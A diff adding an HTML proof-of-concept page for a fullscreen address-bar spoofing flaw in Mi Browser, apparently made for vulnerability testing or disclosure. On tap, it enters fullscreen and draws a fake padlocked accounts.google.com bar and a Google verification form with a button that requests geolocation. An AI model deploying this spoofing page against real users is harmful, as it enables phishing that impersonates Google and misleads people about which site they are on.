@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Mi Browser - Final PoC index</title></head>
+<body style="margin:0;background:#111;color:#fff;font-family:sans-serif;text-align:center;padding:30px">
+<h2>Mi Browser Spoof PoC - index.html</h2>
+<p>Tap to enter fullscreen - test no glitch</p>
+<button onclick="go()" style="padding:15px 30px;font-size:18px;background:#2962ff;color:#fff;border:0;border-radius:8px">START</button>
+<div id="f" style="display:none;position:fixed;inset:0;background:#000;z-index:9999">
+<div style="background:#202124;color:#e8eaed;padding:12px 16px;text-align:left;font-size:13px;border-bottom:1px solid #333">🔒 https://accounts.google.com/signin</div>
+<div style="background:#121212;flex:1;display:flex;align-items:center;justify-content:center;height:calc(100% - 42px)">
+<div style="background:#1e1e1e;border:1px solid #333;border-radius:12px;padding:20px;width:85%;max-width:320px">
+<h3 style="margin:0 0 10px">Google Verification</h3>
+<input value="victim@gmail.com" style="width:100%;padding:12px;box-sizing:border-box;background:#2d2e30;border:1px solid #5f6368;color:#fff;border-radius:8px">
+<br><br>
+<button onclick="navigator.geolocation.getCurrentPosition(a=>alert('LOC SUCCESS:'+a.coords.latitude),e=>alert('Denied Code:'+e.code))" style="width:100%;padding:12px;background:#8ab4f8;border:0;border-radius:8px;font-weight:bold">Verify & Continue</button>
+<p style="color:#fbbc04;font-size:11px;margin-top:10px">This should show origin as github.io, not google.com</p>
+</div>
+</div>
+</div>
+<script>
+function go(){
+ document.documentElement.requestFullscreen().catch(()=>{});
+ document.getElementById('f').style.display='block';
+}
+document.addEventListener('fullscreenchange',()=>{if(!document.fullscreenElement)document.getElementById('f').style.display='none'});
+</script>
+</body>
+</html>
